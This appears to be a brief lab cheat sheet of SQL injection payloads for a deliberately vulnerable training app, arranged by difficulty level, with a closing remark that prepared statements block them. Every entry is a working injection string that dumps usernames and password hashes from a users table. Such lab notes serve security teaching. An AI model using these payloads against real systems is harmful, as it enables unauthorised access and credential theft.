-- Low Level SQL Injection
--gives all users present in the database
1 'OR' 1'='1
--gives users along with hashes
‘ UNION SELECT user,password FROM users#


-- Medium Level SQL Injection
  --gives all users along with the passwords of them in form of hashes
 1 or 1=1  UNION SELECT user,password FROM users#


-- High Level SQL Injection (with obfuscation)
  --gives all users along with passwords in hash values 
1 'or' 1'='1 ' UNION SELECT user,password FROM users#


-- Prevented in Impossible Level: No flaw in input handling (uses prepared statements)
